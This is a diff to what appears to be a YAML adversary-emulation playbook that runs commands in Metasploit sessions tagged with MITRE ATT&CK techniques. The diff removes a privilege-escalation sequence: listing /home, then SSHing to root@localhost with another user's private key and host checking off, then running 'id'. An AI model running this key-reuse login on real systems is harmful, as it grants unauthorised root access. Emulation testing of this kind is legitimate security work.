@@ -155,29 +155,7 @@ commands:
       tactics: "Discovery"
       technique_name: "System Owner/User Discovery"
 
-  - type: msf-session
-    cmd: find /home -ls
-    session: "foothold"
-    metadata:
-      techniques: "T1078.003"
-      tactics: "Defense Evasion,Persistence,Privilege Escalation,Initial Access"
-      technique_name: "Valid Accounts: Local Accounts"
-
-  - type: msf-session
-    cmd: ssh -i /home/webdev/.ssh/id_rsa -o "StrictHostKeyChecking no" root@localhost
-    session: "foothold"
-    metadata:
-      techniques: "T1078.003"
-      tactics: "Defense Evasion,Persistence,Privilege Escalation,Initial Access"
-      technique_name: "Valid Accounts: Local Accounts"
-
-  - type: msf-session
-    cmd: id
-    session: "foothold"
-    metadata:
-      techniques: "T1033"
-      tactics: "Discovery"
-      technique_name: "System Owner/User Discovery"
+  # TODO implement privilege escalation
 
   - type: msf-session
     session: "foothold"
